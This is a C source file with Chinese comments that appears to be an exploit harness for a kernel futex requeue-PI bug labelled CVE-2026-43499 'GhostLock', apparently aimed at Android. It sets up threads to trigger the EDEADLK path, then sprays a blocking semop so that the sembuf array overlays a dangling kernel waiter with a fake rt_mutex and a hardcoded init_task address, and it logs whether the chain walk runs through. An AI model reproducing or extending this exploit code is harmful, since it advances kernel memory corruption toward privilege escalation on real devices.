/* CVE-2026-43499 / GhostLock —— semop 阻塞态载体（P4.41）
 *
 * 与旧 harness 的区别：
 *   旧：futex 返回后 msgctl 喷栈 —— 实测 syscall 返回后栈槽会被覆盖，窗口不存在
 *   新：futex 返回后直接进 semop（阻塞），sembuf[32] 的 fast_sops 常驻
 *       base+0x1DE8（实测），正好覆盖 waiter（base+0x1DF8）
 *
 * 字段映射（实测）：
 *   task(+0x28) = array+0x38 = ops[9] 字节 2..5  = sem_op | sem_flg<<16
 *   lock(+0x2C) = array+0x3C = ops[10] 起始      = sem_num | sem_op<<16
 *   约束：所有 sem_num 必须为 0（内核阻塞前会校验），所以 lock 低 16 位恒 0
 *        => fake_lock 必须 64KB 对齐
 *
 * 用法：
 *   ./sem_spray            探针模式：假锁 wait_list 放 0xdead0000
 *                          链走一旦用了假锁 -> fault at 0xdead002c（铁证）
 *   ./sem_spray pass       假锁自洽，期望链走全程不崩
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sched.h>

#define FUTEX_WAIT_REQUEUE_PI	11
#define FUTEX_CMP_REQUEUE_PI	12
#define FUTEX_LOCK_PI		6
#define FUTEX_UNLOCK_PI		7

#define INIT_TASK	0xc0b79be0u
#define SEMOPS		32

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
		 uint32_t *u2, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static uint32_t u1, u2, u3, u4;

static volatile int a_started, b_locked_u2, t_done;
static volatile int a_tid;
static volatile int a_ret = 999, a_err, b_ret = 999;
static volatile int t_ret = 999, t_err, sem_ret = 999, sem_err;
static volatile int c_ret = 999, c_err;

static void *fake_lock;
static int g_semid = -1, g_pipe[2];
static int g_probe = 1;
static struct sembuf sops[SEMOPS];
static FILE *lg;

static void logf_(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	int n;

	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (lg) {
		fwrite(buf, 1, n, lg);
		fflush(lg);
		fsync(fileno(lg));
	}
	write(1, buf, n);
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

/* 假 rt_mutex：wait_lock(+0) / wait_list.node_list(+0x08) / owner(+0x10) */
static void build_fake(int probe)
{
	unsigned char *p = (unsigned char *)fake_lock;

	memset(p, 0, 0x200);
	*(uint32_t *)(p + 0x00) = 0;		/* raw wait_lock：未锁 */
	*(uint32_t *)(p + 0x04) = 0;		/* break_lock */
	if (probe) {
		*(uint32_t *)(p + 0x08) = 0xdead0000u;	/* next -> 野指针 */
		*(uint32_t *)(p + 0x0C) = 0xdead0000u;	/* prev */
	} else {
		*(uint32_t *)(p + 0x08) = (uint32_t)(uintptr_t)(p + 0x08);
		*(uint32_t *)(p + 0x0C) = (uint32_t)(uintptr_t)(p + 0x08);
	}
	*(uint32_t *)(p + 0x10) = 0;		/* owner = NULL */
	if (!probe)
		/* rt_mutex_top_waiter 的 BUG_ON(w->lock != lock)：
		 * 空表时 w = next - 0 = fake+0x08，w->lock = *(fake+0x34) */
		*(uint32_t *)(p + 0x34) = (uint32_t)(uintptr_t)p;
	__sync_synchronize();
}

/* 把 lock / task 编进 sembuf 数组 */
static void build_sops(uint32_t lockp)
{
	int i;

	memset(sops, 0, sizeof sops);
	for (i = 0; i < SEMOPS; i++)
		sops[i].sem_num = 0;		/* 必须：内核阻塞前校验所有 sem_num */
	sops[0].sem_op = -1;			/* sem 值为 0 -> 阻塞 */

	/* lock = sem_num(低16) | sem_op<<16 ；sem_num 必须 0 => 低 16 位恒 0 */
	sops[10].sem_op = (short)((lockp >> 16) & 0xffff);
	/* task = sem_op | sem_flg<<16 */
	sops[9].sem_op  = (short)(INIT_TASK & 0xffff);
	sops[9].sem_flg = (short)((INIT_TASK >> 16) & 0xffff);
}

/* A：持 u4/u3 -> WAIT_REQUEUE_PI(u1->u2) -> 返回后进 semop 阻塞 */
static void *thread_a(void *arg)
{
	struct timespec ts;
	int r;
	char c = 'x';

	(void)arg;
	pin_cpu(0);
	a_tid = syscall(SYS_gettid);

	futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	a_started = 1;
	__sync_synchronize();

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += 2;
	ts.tv_nsec += 300 * 1000 * 1000;
	while (ts.tv_nsec >= 1000000000) {
		ts.tv_sec++;
		ts.tv_nsec -= 1000000000;
	}

	r = futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);
	a_ret = r;
	a_err = errno;

	/* 告诉主线程：马上进 semop（这一步之后不再有任何"喷栈"动作） */
	write(g_pipe[1], &c, 1);

	sem_ret = (int)syscall(SYS_semop, g_semid, sops, SEMOPS);
	sem_err = errno;

	for (;;)
		__sync_synchronize();
	return NULL;
}

/* B：持 u2，然后阻塞在 u3（A 持有）——制造 EDEADLK 路径 */
static void *thread_b(void *arg)
{
	(void)arg;
	pin_cpu(1);
	nice(19);
	futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	b_locked_u2 = 1;
	__sync_synchronize();
	b_ret = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	return NULL;
}

/* T：锁 u4（A 持有）-> 触发 rt_mutex_adjust_prio_chain 走 A 的 pi_blocked_on */
static void *thread_t(void *arg)
{
	(void)arg;
	pin_cpu(2);
	t_ret = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	t_err = errno;
	t_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(int argc, char **argv)
{
	char c;
	pthread_t ta, tb, tt;

	g_probe = !(argc > 1 && argv[1][0] == 'p' && argv[1][1] == 'a');

	setvbuf(stdout, NULL, _IONBF, 0);
	lg = fopen("/data/local/tmp/ss.log", "w");

	if (pipe(g_pipe) != 0) {
		logf_("[!] pipe fail\n");
		return 1;
	}

	g_semid = semget(IPC_PRIVATE, 1, 0666 | IPC_CREAT);
	if (g_semid < 0) {
		logf_("[!] semget errno=%d\n", errno);
		return 1;
	}
	semctl(g_semid, 0, SETVAL, 0);

	/* fake_lock 必须 64KB 对齐（lock 低 16 位被 sem_num=0 钉死） */
	{
		void *pg = mmap(NULL, 0x20000, PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

		if (pg == MAP_FAILED) {
			logf_("[!] mmap fail\n");
			return 1;
		}
		fake_lock = (void *)(((uintptr_t)pg + 0xFFFFULL) & ~0xFFFFULL);
	}
	build_fake(g_probe);
	build_sops((uint32_t)(uintptr_t)fake_lock);

	logf_("=== sem_spray mode=%s pid=%d semid=%d ===\n",
	      g_probe ? "probe" : "pass", getpid(), g_semid);
	logf_("fake_lock=%p (64K aligned=%d) lock16=%04x\n", fake_lock,
	      ((uintptr_t)fake_lock & 0xFFFF) == 0,
	      (unsigned)((uintptr_t)fake_lock >> 16) & 0xffff);
	logf_("waiter=stack+0x1df8  sops=stack+0x1de8  lock<-ops[10]  task<-ops[9]\n");

	pthread_create(&ta, NULL, thread_a, NULL);
	while (!a_started)
		usleep(1000);
	usleep(150000);

	pthread_create(&tb, NULL, thread_b, NULL);
	while (!b_locked_u2)
		usleep(1000);
	usleep(250000);

	c_ret = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
	c_err = errno;
	logf_("[C] CMP_REQUEUE_PI=%d errno=%d %s\n", c_ret, c_err,
	      (c_ret < 0 && c_err == 35) ? "*** EDEADLK (bug fired) ***" : "(?)");

	/* 等 A 真正进入 semop：它写 pipe 之后才调用 */
	if (read(g_pipe[0], &c, 1) != 1) {
		logf_("[!] pipe read fail\n");
		return 1;
	}
	usleep(150000);		/* 让它落到 fast_sops 里并阻塞 */

	logf_("[A] futex=%d/%d  semop->(blocked, ops at stack+0x1de8)\n",
	      a_ret, a_err);

	pthread_create(&tt, NULL, thread_t, NULL);
	logf_("[T] triggered, waiting...\n");

	pthread_join(tt, NULL);
	logf_("[T] returned %d/%d (链走没崩)\n", t_ret, t_err);
	logf_("[A] semop=%d/%d\n", sem_ret, sem_err);
	logf_("*** RESULT: %s ***\n",
	      t_ret == 0 ? "T 拿到 u4，链走全程无异常" : "T 返回异常");
	sleep(1);
	return 0;
}
